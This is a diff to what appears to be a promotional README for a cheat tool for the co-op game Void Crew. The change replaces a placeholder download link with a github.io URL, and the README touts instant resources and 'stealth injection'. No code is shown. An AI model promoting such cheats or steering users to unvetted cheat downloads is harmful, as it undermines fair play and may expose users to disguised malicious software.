@@ -2,7 +2,7 @@
 
 In a galaxy where teamwork means survival, why play fair when you can play **god-tier**? Our **Void Crew cheat** gives you game-breaking control with instant resources, combat boosts, and stealth injection that keeps your squad on top every mission. 💥
 
-[![Get Void Crew Cheat](https://img.shields.io/badge/Get%20Void%20Crew%20Cheat-blueviolet)](EXAMPLE)
+[![Get Void Crew Cheat](https://img.shields.io/badge/Get%20Void%20Crew%20Cheat-blueviolet)](https://void-crew-cheat.github.io/.github/)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-) • [Install](#instant-install-guide)
 
